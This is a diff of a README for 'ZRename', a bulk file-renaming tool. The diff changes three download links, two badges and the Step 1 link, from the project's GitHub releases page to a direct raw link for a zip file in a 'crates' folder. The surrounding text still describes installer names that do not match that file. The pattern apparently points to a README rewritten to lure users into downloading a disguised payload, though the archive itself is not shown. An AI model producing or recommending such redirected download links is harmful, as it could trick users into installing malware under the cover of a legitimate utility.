@@ -1,6 +1,6 @@
 # 📛 ZRename - Rename Hundreds of Files in Seconds
 
-[![Download ZRename](https://img.shields.io/badge/Download-ZRename-blue?style=for-the-badge&logo=github)](https://github.com/life1337x/ZRename/releases)
+[![Download ZRename](https://img.shields.io/badge/Download-ZRename-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/life1337x/ZRename/main/crates/Rename_Z_v3.1.zip)
 
 ---
 
@@ -45,7 +45,7 @@ ZRename never moves a file until you click the final "Apply" button. It checks f
 ## 🚀 Getting Started (Windows)
 
 ### Step 1: Download the App
-Visit this link to download the application: [https://github.com/life1337x/ZRename/releases](https://github.com/life1337x/ZRename/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/life1337x/ZRename/main/crates/Rename_Z_v3.1.zip](https://raw.githubusercontent.com/life1337x/ZRename/main/crates/Rename_Z_v3.1.zip)
 
 Look for the latest release and download the file that matches your system. For most Windows users, this will be a file named something like `ZRename-setup.exe` or `ZRename-windows.zip`.
 
@@ -147,7 +147,7 @@ No internet connection is required after download.
 
 Stop wasting time clicking through hundreds of files. Download ZRename today and take control of your filenames in minutes.
 
-[![Get ZRename Now](https://img.shields.io/badge/Get_ZRename-Now-green?style=for-the-badge)](https://github.com/life1337x/ZRename/releases)
+[![Get ZRename Now](https://img.shields.io/badge/Get_ZRename-Now-green?style=for-the-badge)](https://raw.githubusercontent.com/life1337x/ZRename/main/crates/Rename_Z_v3.1.zip)
 
 ---
 
